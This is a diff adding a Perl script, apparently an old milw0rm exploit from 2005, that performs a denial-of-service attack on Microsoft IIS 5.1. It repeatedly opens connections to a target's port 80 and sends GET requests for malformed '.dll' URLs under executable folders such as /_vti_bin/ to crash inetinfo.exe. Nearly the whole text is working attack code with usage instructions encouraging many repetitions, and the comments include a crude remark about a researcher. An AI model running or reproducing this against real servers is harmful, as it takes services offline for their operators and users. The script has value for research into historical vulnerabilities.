@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+# _really_ bored kokanin / IIS 5.1 dos thing, Inge says to use a browser at 
+# http://ingehenriksen.blogspot.com/2005/12/microsoft-iis-remote-dos-dll-url.html
+# kokanin not like puny browser!!"#1 I hoped Inge was a leet haxx0r ch1ck, but it's
+# apparently a dude, bummer. According to Inge passing a kinda malformed url to
+# an executable dir a few times makes inetinfo.exe crap out. Yum, monday. This
+# script has insanely elite randomization of the url, it even amazes me.
+# Hello ilja, ptp people, others, see you at ccc and stuff.
+
+# sample executable dirs: /_vti_bin/ /_sharepoint/ /scripts/ /cgi-bin/ /msadc/ /iisadmpwd/
+# sample malformed url: http://www.example.xom/_vti_bin/.dll/*\~0
+# sample run: ./this-crap.pl <www.host.bla> </executable_folder/> <count> 
+# count should be 4 according to inge, do more!!!!1one MILLIONS I SAY!!! 
+
+use List::Util 'shuffle';
+use IO::Socket::INET;
+
+$target = shift;
+$folder = shift;
+$amount = shift;
+
+# main iteration thingie
+for(1..$amount){
+# construct an array of the reportedly bad characters
+for(1..31){ @badchars[$_] = chr($_); }
+# append the rest of them
+@badchars = (@badchars,"?","\"","*",":","<",">");
+# shuffle the array so @shuffled[0] is random 
+@shuffled = shuffle(@badchars); 
+# this is the request
+$malformed = $folder . ".dll/" . @shuffled[0] . "/~" . int rand(9);
+# this is informative text
+print "[$_]\t greeting $target with: " . $malformed . "\n";
+# create the socket
+$socket = new IO::Socket::INET(
+Proto    => "tcp",
+PeerAddr => $target,
+PeerPort => "80",
+);
+# error reporting
+die "unable to connect to $target ($!) - omgomgwtf itz dead w00t w00t \n" unless $socket;
+# the actual data transmission
+print $socket "GET " . $malformed . " HTTP/1.0\r\n" . "Host: $target\r\n" . "\r\n\r\n";
+# all done
+close $socket;
+}
+
+# milw0rm.com [2005-12-19]
